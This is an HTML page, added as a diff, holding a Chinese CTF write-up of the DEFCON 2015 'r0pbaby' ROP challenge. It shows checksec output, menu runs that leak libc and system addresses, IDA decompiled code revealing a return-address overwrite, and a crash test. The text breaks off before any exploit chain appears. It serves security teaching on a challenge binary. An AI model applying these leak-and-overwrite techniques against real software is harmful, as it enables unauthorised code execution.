@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>DEFCON-2015-r0pbaby | r00tk1t&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="经典的简单64位ROP链构造题，为PWN选手找回自信。由于是入门的题目，所以一般看的都是初学者，我尽量写的比较详细。">
+<meta name="keywords" content="pwn,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DEFCON-2015-r0pbaby">
+<meta property="og:url" content="https://r00tk1ts.github.io/2017/09/16/DEFCON-2015-r0pbaby/index.html">
+<meta property="og:site_name" content="r00tk1t&#39;s blog">
+<meta property="og:description" content="经典的简单64位ROP链构造题，为PWN选手找回自信。由于是入门的题目，所以一般看的都是初学者，我尽量写的比较详细。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/ctf/pwn/20170916_1.jpg">
+<meta property="og:image" content="https://r00tk1ts.github.io/images/ctf/pwn/20170916_2.jpg">
+<meta property="og:updated_time" content="2020-10-20T13:01:02.351Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DEFCON-2015-r0pbaby">
+<meta name="twitter:description" content="经典的简单64位ROP链构造题，为PWN选手找回自信。由于是入门的题目，所以一般看的都是初学者，我尽量写的比较详细。">
+<meta name="twitter:image" content="https://r00tk1ts.github.io/images/ctf/pwn/20170916_1.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="r00tk1t&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.png">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">r00tk1t</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+        
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives">所有文章</a></li>
+                        
+                            <li><a href="/tags">标签</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                            
+                                <a class="fl zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                            
+                                <a class="fl QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/SEH-overwrite/" style="font-size: 10px;">SEH overwrite</a> <a href="/tags/algorithm/" style="font-size: 11.67px;">algorithm</a> <a href="/tags/browser/" style="font-size: 10px;">browser</a> <a href="/tags/chrome/" style="font-size: 16.67px;">chrome</a> <a href="/tags/chrome-sandbox/" style="font-size: 16.67px;">chrome-sandbox</a> <a href="/tags/cpp/" style="font-size: 20px;">cpp</a> <a href="/tags/cpp-primer/" style="font-size: 18.33px;">cpp-primer</a> <a href="/tags/cpp-templates/" style="font-size: 11.67px;">cpp-templates</a> <a href="/tags/dll-hooking/" style="font-size: 10px;">dll hooking</a> <a href="/tags/exploit/" style="font-size: 12.5px;">exploit</a> <a href="/tags/glibc/" style="font-size: 10px;">glibc</a> <a href="/tags/glibc-heap/" style="font-size: 13.33px;">glibc-heap</a> <a href="/tags/linux/" style="font-size: 10.83px;">linux</a> <a href="/tags/linux-kernel/" style="font-size: 14.17px;">linux-kernel</a> <a href="/tags/mmap/" style="font-size: 10px;">mmap</a> <a href="/tags/novice/" style="font-size: 17.5px;">novice</a> <a href="/tags/php/" style="font-size: 10.83px;">php</a> <a href="/tags/pool/" style="font-size: 10px;">pool</a> <a href="/tags/pwn/" style="font-size: 19.17px;">pwn</a> <a href="/tags/pwnable-kr/" style="font-size: 15px;">pwnable.kr</a> <a href="/tags/resources/" style="font-size: 10px;">resources</a> <a href="/tags/stack-overrun/" style="font-size: 11.67px;">stack-overrun</a> <a href="/tags/tutorial/" style="font-size: 10px;">tutorial</a> <a href="/tags/ulk/" style="font-size: 14.17px;">ulk</a> <a href="/tags/web/" style="font-size: 10.83px;">web</a> <a href="/tags/windows/" style="font-size: 15.83px;">windows</a> <a href="/tags/windows-kernel/" style="font-size: 14.17px;">windows-kernel</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/wrk/" style="font-size: 12.5px;">wrk</a>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://eternalsakura13.com">樱花师傅</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://chybeta.github.io/">Chybeta</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://whereisk0shl.top/">k0shl</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://o0xmuhe.github.io/">o0xmuhe</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://bestwing.me/">swing</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://yixuankeer.win/">joker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.hackersb.cn/">王松_Striker</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.hackfun.org/">4ido10n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/iamstudy/">l3m0n</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/Ox9A82/">Ox9A82</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://mxny.org/">麦香浓郁</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://0x48.pw/">Hcamael</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.nuptzj.cn/">画船听雨</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.bodkin.ren/">老锥</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.zerokeeper.com/">ZeroKeeper</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://www.ycjcl.cc/">信鑫</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.wowotech.net/">wowotech</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://fuzzysecurity.com/">fuzzySecurity</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://rootkits.xyz/">rootkits.xyz</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.pentestingexperts.com/">pentestingexperts</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://blog.skylined.nl/">skylined</a>
+                    
+                      <a target="_blank" class="main-nav-link switch-friends-link" href="https://systemk1t.github.io/">systemk1t</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">二进制狗一枚，懂点Web安全，一个伪装成程序员混迹在某公司的菜鸡。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">r00tk1t</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">r00tk1t</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">二进制安全 | Web安全 | 伪装成程序员的菜鸡</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives">所有文章</a></li>
+                
+                    <li><a href="/tags">标签</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="mailto: 1903442252@qq.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://github.com/r00tk1ts" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/r00tk1t-5" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/2698344533" title="weibo">weibo</a>
+                    
+                        <a class="QQ" target="_blank" href="https://user.qzone.qq.com/1903442252" title="QQ">QQ</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-DEFCON-2015-r0pbaby" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/09/16/DEFCON-2015-r0pbaby/" class="article-date">
+      <time datetime="2017-09-16T07:03:11.000Z" itemprop="datePublished">2017-09-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DEFCON-2015-r0pbaby
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/ctf/">ctf</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>经典的简单64位ROP链构造题，为PWN选手找回自信。由于是入门的题目，所以一般看的都是初学者，我尽量写的比较详细。</p>
+<a id="more"></a>
+<h1 id="DEFCONF-2015-r0pbaby"><a href="#DEFCONF-2015-r0pbaby" class="headerlink" title="DEFCONF-2015-r0pbaby"></a>DEFCONF-2015-r0pbaby</h1><p>题源：<a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/babys-first/r0pbaby</a></p>
+<h2 id="踩点"><a href="#踩点" class="headerlink" title="踩点"></a>踩点</h2><p>先看一下文件描述以及保护状态：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file r0pbaby</span><br><span class="line">r0pbaby: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, stripped</span><br><span class="line"></span><br><span class="line"><span class="meta">gdb-peda$</span> checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这是64位可执行文件，开启了NX、PIE和FORTIFY。</p>
+<p>执行一下，看看程序表现：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./r0pbaby</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 1</span><br><span class="line">libc.so.6: 0x00007FBE204DD9B0</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 2</span><br><span class="line">Enter symbol: system</span><br><span class="line">Symbol system: 0x00007FBE1FD30390</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 5</span><br><span class="line">1234</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 3</span><br><span class="line">123</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br></pre></td></tr></table></figure></p>
+<p>程序提供4个选项，执行效果来看，1可以获取libc的基址；2可以获取libc的某个函数地址，我们输入system发现获取了对应的地址；3可以用来copy数据到栈上，在两次输入时，当输入的字符超过指定的大小时，程序退出并打印Bad choice。</p>
+<p>按照惯例，显然1和2就是leak info所用，3应该存在栈溢出，这里也有好的提示了大小应该是1024。</p>
+<p>从卖相上来看，这题不做BROP可惜了。</p>
+<h2 id="屠龙宝刀IDA"><a href="#屠龙宝刀IDA" class="headerlink" title="屠龙宝刀IDA"></a>屠龙宝刀IDA</h2><p>既然给了二进制，那就丢到IDA reverse看一下。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rsi@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// rdi@1</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// eax@4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// r14@15</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// er13@17</span></span><br><span class="line">  <span class="keyword">size_t</span> v8; <span class="comment">// r12@17</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax@18</span></span><br><span class="line">  <span class="keyword">void</span> *handle; <span class="comment">// [sp+8h] [bp-448h]@1</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">1088</span>]; <span class="comment">// [sp+10h] [bp-440h]@2</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [sp+450h] [bp+0h]@22</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  signal(<span class="number">14</span>, handler);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nWelcome to an easy Return Oriented Programming challenge..."</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Menu:"</span>);</span><br><span class="line">  v3 = (<span class="keyword">char</span> *)<span class="number">1</span>;</span><br><span class="line">  v4 = <span class="string">"libc.so.6"</span>;</span><br><span class="line">  handle = dlopen(<span class="string">"libc.so.6"</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_BF7(v4, v3);</span><br><span class="line">          <span class="keyword">if</span> ( !sub_B9A((__int64)nptr, <span class="number">1024L</span>L) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bad choice."</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">          &#125;</span><br><span class="line">          v3 = <span class="number">0L</span>L;</span><br><span class="line">          v5 = strtol(nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v5 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          __printf_chk(<span class="number">1L</span>L, <span class="string">"Enter symbol: "</span>);</span><br><span class="line">          v3 = (<span class="keyword">char</span> *)<span class="number">64</span>;</span><br><span class="line">          <span class="keyword">if</span> ( sub_B9A((__int64)nptr, <span class="number">64L</span>L) )</span><br><span class="line">          &#123;</span><br><span class="line">            dlsym(handle, nptr);</span><br><span class="line">            v3 = <span class="string">"Symbol %s: 0x%016llX\n"</span>;</span><br><span class="line">            v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">1</span>;</span><br><span class="line">            __printf_chk(<span class="number">1L</span>L, <span class="string">"Symbol %s: 0x%016llX\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v4 = <span class="string">"Bad symbol."</span>;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"Bad symbol."</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        v3 = <span class="string">"libc.so.6: 0x%016llX\n"</span>;</span><br><span class="line">        v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="number">1</span>;</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, <span class="string">"libc.so.6: 0x%016llX\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      __printf_chk(<span class="number">1L</span>L, <span class="string">"Enter bytes to send (max 1024): "</span>);</span><br><span class="line">      sub_B9A((__int64)nptr, <span class="number">1024L</span>L);</span><br><span class="line">      v3 = <span class="number">0L</span>L;</span><br><span class="line">      v6 = (<span class="keyword">signed</span> <span class="keyword">int</span>)strtol(nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v6 - <span class="number">1</span> &gt; <span class="number">0x3FF</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = <span class="string">"Invalid amount."</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid amount."</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = <span class="number">0</span>;</span><br><span class="line">          v8 = <span class="number">0L</span>L;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v9 = _IO_getc(<span class="built_in">stdin</span>);</span><br><span class="line">            <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            nptr[v8] = v9;</span><br><span class="line">            v8 = ++v7;</span><br><span class="line">            <span class="keyword">if</span> ( v6 &lt;= v7 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">          &#125;</span><br><span class="line">          v8 = v7 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v8 = <span class="number">0L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_22:</span><br><span class="line">        v3 = nptr;</span><br><span class="line">        v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;savedregs;</span><br><span class="line">        <span class="built_in">memcpy</span>(&amp;savedregs, nptr, v8);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">LABEL_24:</span><br><span class="line">    v4 = <span class="string">"Bad choice."</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bad choice."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  dlclose(handle);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Exiting."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>程序流程状态机虽然都写在main里，但比较简单，通过阅读代码，发现实际上这并不是栈溢出，而是程序本身就执行了<code>memcpy(&amp;saveregs, nptr, v8);</code>。saveregs是IDA的关键字，保存的实际上是函数的栈帧指针RBP和返回地址。我们来看看上面在执行时，两次选择3菜单时发生了什么。</p>
+<p>第一次选择3时，输入个数为5，此后输入了1234+enter，按照程序的逻辑，v6为5，而循环_IO_getc()时，直到从输入缓冲区拿到enter，才跳转到了LABEL_22，程序的RBP被覆盖了5个字节。此后继续循环，由于没有退出main函数所以暂时看不出影响。</p>
+<p>第二次选择3时，输入个数为3，此后输入了123+enter，这一次v6为3，循环到’3’的时候，跳转到了LABEL_22，此时输入缓冲区还有个enter。这一次用123覆盖了RBP，而后继续循环进入了sub_B9A()，由于输入缓冲区遗留的enter，实际上也就是<code>\x0a</code>，程序break并返回0，然后输出了bad choice并退出，由于仅仅覆盖了RBP,ret addr还是正确的，所以程序没有报segmentation error。</p>
+<p>为验证这一猜想，我们试试15个字符，即覆盖了ret addr：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./r0pbaby</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 15</span><br><span class="line">123456789012345</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: Bad choice.</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure></p>
+<p>同样的，我们也可以不利用输入缓冲区中的<code>\x0a</code>，使用程序本身的功能4：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ./r0pbaby</span><br><span class="line"></span><br><span class="line">Welcome to an easy Return Oriented Programming challenge...</span><br><span class="line">Menu:</span><br><span class="line">1) Get libc address</span><br><span class="line">2) Get address of a libc function</span><br><span class="line">3) Nom nom r0p buffer to stack</span><br><span class="line">4) Exit</span><br><span class="line">: 3</span><br><span class="line">Enter bytes to send (max 1024): 15  </span><br><span class="line">12345678901234</span><br><span class="line">1) Get libc 